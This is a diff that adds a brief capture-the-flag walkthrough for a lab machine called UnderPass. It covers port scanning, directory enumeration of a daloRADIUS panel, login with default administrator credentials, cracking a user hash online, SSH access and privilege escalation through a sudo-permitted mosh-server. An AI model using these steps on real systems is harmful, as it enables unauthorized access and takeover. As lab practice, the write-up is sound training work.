@@ -1,0 +1,40 @@
+
+#UNDERPASS (linux lab)
+
+
+
+nmap -sC -sV 10.10.11.48 -T5
+
+nano /etc/hosts
+>10.10.11.48 underpass.htb underpass.htb/daloradius
+
+dirsearch -u "http://underpass.htb/daloradius/app" -t 50 
+(start with only UNDERPASS.HTB than add all the this daloradius/app)
+
+On Browser:- 
+
+http://underpass/daloradius/app/user/login/php
+         
+                  OR
+
+http://underpass/daloradius/app/operators/home-main.php
+
+username:- administrator
+password:- radius 
+
+After login go to management and than on left side we can see listuser to get our code copy that and go to CRACKSTATION.NET to crack the password 
+
+On Kali:-
+
+ssh svcMosh@underpass.htb 
+(paste the password)
+
+>ls
+>cat user.txt
+(user flag)
+
+>sudo -l 
+> mosh --server="sudo/usr/bin/mosh-server" localhost
+>ls
+>cat root.txt
+(root flag)
